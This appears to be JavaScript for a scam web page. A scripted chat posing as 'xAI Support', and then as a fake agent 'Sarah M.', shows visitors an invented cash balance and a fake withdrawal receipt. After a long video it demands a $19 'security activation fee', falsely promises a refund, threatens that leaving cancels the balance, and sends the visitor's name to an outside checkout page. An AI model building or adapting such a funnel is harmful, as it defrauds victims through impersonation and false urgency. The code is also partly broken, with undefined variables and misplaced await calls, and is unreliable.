<script>
(function(){
var KEY='grk_attr_params';
var curP=new URLSearchParams(window.location.search||'');
var obj={};curP.forEach(function(v,k){if(v)obj[k]=v});
if(Object.keys(obj).length>0){
try{var raw=localStorage.getItem(KEY);var ex={};if(raw)try{ex=JSON.parse(raw).p||{}}catch(e){}
for(var k in obj)ex[k]=obj[k];localStorage.setItem(KEY,JSON.stringify({t:Date.now(),p:ex}))}catch(e){}
}
try{var vid=obj.visit_id||localStorage.getItem('grk_visit_id');
if(!vid)vid='vis_'+Date.now().toString(36)+'_'+Math.random().toString(36).substring(2,9);
obj.visit_id=vid;localStorage.setItem('grk_visit_id',vid)}catch(e){}
window.grkParams=obj;
window.grkUrlWith=function(base,extra){
var m={};for(var k in obj)m[k]=obj[k];if(extra)for(var j in extra)if(extra[j])m[j]=extra[j];
var hs=String(base).split('#');var hash=hs[1]?'#'+hs[1]:'';var ps=hs[0].split('?');
var qs=new URLSearchParams(ps[1]||'');for(var key in m)if(!qs.has(key))qs.set(key,m[key]);
var q=qs.toString();return ps[0]+(q?'?'+q:'')+hash};
})();

var urlP=new URLSearchParams(window.grkUrlWith('x').split('?')[1]||'');
var balVal=urlP.get('balance')||'0';
var targetBal=parseFloat(balVal)||0;
var curBal=0;
var balEl=document.getElementById('headerBalance');
balEl.textContent='0.00';

var balAnim=null;
function setBal(v,anim){
v=Math.max(0,v);curBal=v;
if(balAnim){clearInterval(balAnim);balAnim=null}
var from=parseFloat(balEl.textContent)||0;
if(v>from&&navigator.vibrate)try{navigator.vibrate(80)}catch(e){}
if(!anim){balEl.textContent=v.toFixed(2);return}
var steps=20,i=0;
balAnim=setInterval(function(){i++;var nv=from+(v-from)*(i/steps);balEl.textContent=nv.toFixed(2);
balEl.style.transform='scale(1.08)';setTimeout(function(){balEl.style.transform=''},90);
if(i>=steps){clearInterval(balAnim);balAnim=null;balEl.textContent=v.toFixed(2)}},40);
}

window.addEventListener('message',function(e){
var d=e.data;if(!d||typeof d!=='object')return;
if(d.type==='sp-add-balance'){setBal(curBal+(parseFloat(d.reward)||0),true)}
else if(d.type==='finalizar_musicas'||d.name==='finalizar_musicas'){
var fb=parseFloat(d.finalBalance);setBal(isNaN(fb)?Math.max(curBal,targetBal):fb,true)}
});

(function(){var fired=false;function fire(){if(fired)return;var t=window.trkFunnel;if(t&&typeof t.step==='function'){try{t.step('chat_comeco')}catch(e){}fired=true;return true}return false}
if(fire())return;var tries=0;var id=setInterval(function(){tries++;if(fire()||tries>40)clearInterval(id)},250)})();
</script>

<script>
(function(){
var body=document.getElementById('chatBody');
var input=document.getElementById('chatInput');
var AV='/robot-header-logo.png';
var agentNameStr='xAI Support';
var agentAvatar=document.getElementById('agentAvatar');
var agentNameEl=document.getElementById('agentName');
var vars={nome:'',balance:'0.00'};

var CHECKOUT_A='https://pay.secure.official-partner.online/';
var CHECKOUT_B='https://pay.secure.official-partner.online/b';
var CHECKOUT=Math.random()<.5?CHECKOUT_A:CHECKOUT_B;

function fill(t){return t.replace(/\{\{(\w+)\}\}/g,function(_,k){
if(k==='balance')return(curBal>0?curBal:parseFloat(balVal)||1150.43).toFixed(2);
return vars[k]||''})}
function scroll(){body.scrollTop=body.scrollHeight}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}

function botRow(inner,cls){
var row=document.createElement('div');row.className='row bot';
var img=document.createElement('img');
img.className='av'+(AV==='/robot-header-logo.png'?' logo-av':' sarah-av');
img.src=AV;img.alt=agentNameStr;
var b=document.createElement('div');b.className='bubble'+(cls?' '+cls:'');
if(typeof inner==='string')b.textContent=inner;else b.appendChild(inner);
row.appendChild(img);row.appendChild(b);body.appendChild(row);scroll();return row}

function userRow(text){var row=document.createElement('div');row.className='row user';
var b=document.createElement('div');b.className='bubble';b.textContent=text;
row.appendChild(b);body.appendChild(row);scroll()}

async function typing(ms){
var el=document.createElement('span');el.className='typing';el.innerHTML='<i></i><i></i><i></i>';
var row=botRow(el);await sleep(ms);row.remove()}

async function say(text){text=fill(text);
await typing(Math.min(1600,500+text.length*12));botRow(text)}

function activateRep(){
AV='/images/sarah-avatar.png';
agentNameStr='Sarah M.';
agentAvatar.src=AV;agentAvatar.alt=agentNameStr;
agentAvatar.classList.remove('logo-av');
agentAvatar.classList.add('sarah-av');
agentNameEl.textContent=agentNameStr}

var SVG_CHECK='<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="m8 12 2.7 2.7L16.5 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
var SVG_SPIN='<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3a9 9 0 1 0 9 9" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>';
var SVG_ALERT='<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3 2.8 20h18.4L12 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 9v5M12 17.3v.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
var SVG_REWARD='<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M14.8 8.5h-4a2 2 0 0 0 0 4h2.4a2 2 0 1 1 0 4H9M12 6.5v2M12 16.5v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';

async function sayStatus(text,type){
text=fill(text);await typing(Math.min(1600,500+text.length*12));
var w=document.createElement('span');w.className='msg-icon';
var icon=document.createElement('span');
icon.innerHTML=type==='pending'?SVG_SPIN:type==='alert'?SVG_ALERT:type==='reward'?SVG_REWARD:SVG_CHECK;
var sv=icon.querySelector('svg');if(sv)sv.classList.add(type||'success');
var c=document.createElement('span');c.textContent=text;
w.appendChild(icon);w.appendChild(c);return botRow(w)}

async function updateStatus(row,text,type){
var w=row&&row.querySelector('.msg-icon');if(!w)return;
w.classList.add('changing');await sleep(220);
var icon=w.querySelector('span:first-child');
var c=w.querySelector('span:last-child');
if(icon){icon.innerHTML=type==='pending'?SVG_SPIN:SVG_CHECK;var sv=icon.querySelector('svg');if(sv){sv.className='';sv.classList.add(type||'success')}}
if(c)c.textContent=fill(text);w.classList.remove('changing');scroll()}

var activeReviewsIframe=null;
function media(url,height){
var f=document.createElement('iframe');f.src=fill(url);f.height=height;
f.setAttribute('frameborder','0');
f.setAttribute('scrolling','no');
f.style.cssText='width:100%;height:'+height+'px;border:0;display:block;overflow:hidden;';
if(url.indexOf('reviews')!==-1){activeReviewsIframe=f;}
botRow(f,'media');return f}

window.addEventListener('message',function(e){
  var d=e.data;
  if(d&&d.type==='resize-reviews'&&d.height&&activeReviewsIframe){
    activeReviewsIframe.style.height=d.height+'px';
    activeReviewsIframe.height=d.height;
    if(body){
      setTimeout(function(){
        body.scrollTo({top:body.scrollHeight,behavior:'smooth'});
      },60);
    }
  }
});

function player(url,pad,funnelKey){
var w=document.createElement('div');
if(funnelKey){w.setAttribute('data-funnel-view',funnelKey)}
w.style.cssText='position:relative;padding:'+pad+'% 0 0 0;border-radius:14px;overflow:hidden;background:#000;box-shadow:0 6px 20px rgba(0,0,0,0.5);';
var f=document.createElement('iframe');f.frameBorder='0';f.setAttribute('allowfullscreen','');
f.setAttribute('referrerpolicy','origin');f.src=url;
f.style.cssText='position:absolute;top:0;left:0;width:100%;height:100%;border:0;border-radius:14px;';
w.appendChild(f);botRow(w,'media');return f}

function clearInput(){input.innerHTML=''}

function askButton(label, funnelKey){return new Promise(function(resolve){
clearInput();var b=document.createElement('button');b.className='cta';b.textContent=label;
if(funnelKey){b.setAttribute('data-funnel-step',funnelKey)}
b.onclick=function(){
if(funnelKey){try{if(window.trkFunnel&&typeof window.trkFunnel.step==='function'){window.trkFunnel.step(funnelKey)}}catch(e){}}
clearInput();userRow(label);resolve(label)};
input.appendChild(b);scroll()})}

function askText(placeholder){return new Promise(function(resolve){
clearInput();var wrap=document.createElement('form');wrap.className='field';
var i=document.createElement('input');i.type='text';i.placeholder=placeholder;i.autocomplete='name';
var s=document.createElement('button');s.type='submit';s.innerHTML='&#10148;';
wrap.appendChild(i);wrap.appendChild(s);
wrap.onsubmit=function(e){e.preventDefault();var v=i.value.trim();if(!v)return;clearInput();userRow(v);resolve(v)};
input.appendChild(wrap);scroll();setTimeout(function(){i.focus()},200)})}

function waitForReviews(timeoutMs){return new Promise(function(resolve){
var done=false;function finish(){if(done)return;done=true;window.removeEventListener('message',onMsg);resolve()}
function onMsg(e){var d=e.data;var s=typeof d==='string'?d:(d&&(d.name||d.type))||'';
if(String(s).indexOf('finalizar_musicas')!==-1)finish()}
window.addEventListener('message',onMsg);setTimeout(finish,timeoutMs)})}

function step(name){
var key='trk_'+name;try{if(sessionStorage.getItem(key))return;sessionStorage.setItem(key,'1')}catch(e){}
var tries=0;(function attempt(){var t=window.trkFunnel;
if(t&&typeof t.step==='function'){try{t.step(name)}catch(e){}return}
if(++tries<=240)setTimeout(attempt,250)})()}

step('boas_vindas');

await sleep(2500);
await say("I need your name so I can verify you're a new user in our system.");
await sleep(2000);

await say('(Write below)');
vars.nome=await askText('Enter your name here...','coleta_de_nome');

// 7. checagem_de_elegibilidade

if(checkRow){checkRow.setAttribute('data-funnel-view','checagem_de_elegibilidade')}

await updateStatus(rcptLoad,'Generating your commission withdrawal receipt...','pending');
await sleep(3000);
var rcptBal=(curBal>0?curBal:parseFloat(balVal)||1150.43).toFixed(2);
var rcptFrame=media('/chat/receipt/?nome='+encodeURIComponent(vars.nome)+'&total='+encodeURIComponent(rcptBal),380);
rcptFrame.className='receipt-frame';
rcptFrame.setAttribute('data-funnel-view','recibo_de_saque');
rcptFrame.onload=function(){try{var r=rcptFrame.contentDocument&&rcptFrame.contentDocument.querySelector('.receipt');
if(!r)return;function fit(){var h=Math.ceil(r.getBoundingClientRect().height);rcptFrame.style.height=h+'px';rcptFrame.height=h}
new ResizeObserver(fit).observe(r);fit()}catch(e){}};
await sleep(3500);

await say('(Click the button below to continue)');
await askButton('I want to claim my reward','recibo_de_saque');

// 9. vsl_pitch
step('vsl_pitch');
await sayStatus('Your access to withdraw will be granted after this short explanatory video','alert');
player('https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/6af56d47fe273cf6c7822bb0/v4/embed.html',56.25,'vsl_pitch');
await sleep(322000);

// 10. aviso_da_taxa_de_19
step('aviso_da_taxa_de_19');
var feeMsg = await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $19.00\n\nThis is to verify your account and ensure that you are not a bot.','reward');
if(feeMsg){feeMsg.setAttribute('data-funnel-view','aviso_da_taxa_de_19')}
await sleep(4000);
await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}','alert');
await sleep(3500);
await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
await sleep(2500);
await say('You are being redirected to the payment page...');

// 11. redirecionamento_checkout
step('redirecionamento_checkout');
var checkoutUrl=window.grkUrlWith(CHECKOUT,{
name:vars.nome||'',nome:vars.nome||'',ref:'chat',
visit_id:(window.grkParams&&window.grkParams.visit_id)||localStorage.getItem('grk_visit_id')||'',
balance:rcptBal});
setTimeout(function(){window.location.href=checkoutUrl},2000);
}

run();
})();
</script>
